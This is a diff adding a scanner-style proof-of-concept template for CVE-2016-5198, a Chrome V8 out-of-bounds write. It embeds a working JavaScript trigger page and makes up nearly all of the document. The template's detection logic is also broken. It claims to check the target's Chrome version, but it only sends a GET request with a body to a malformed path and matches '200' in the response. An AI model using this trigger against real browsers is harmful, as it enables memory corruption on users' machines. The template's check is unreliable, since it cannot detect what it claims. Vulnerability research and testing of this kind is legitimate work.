@@ -1,0 +1,50 @@
+[info]
+author = "ave"
+description = "通过特制 HTML 页面触发 Google Chrome V8 引擎越界写入漏洞，验证目标 Chrome 版本是否低于 54.0.2840.90（Linux）/54.0.2840.87（Windows/Mac）/54.0.2840.85（Android）"
+id = "POC-AVE-2016-0600"
+name = "CVE-2016-5198 PoC"
+severity = "high"
+tags = ["ave-2016-0600"]
+vuln_id = [
+    "CVE-2016-5198",
+    "AVE-2016-0600",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-2016-5198-poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<html>
+<body>
+<script>
+function Ctor() {
+  n = new Set();
+}
+function Check() {
+  n.xyz = 0x826852f4;
+  parseInt();
+}
+for(var i=0; i<2000; ++i) {
+  Ctor();
+}
+for(var i=0; i<2000; ++i) {
+  Check();
+}
+Ctor();
+Check();
+</script>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["200"]
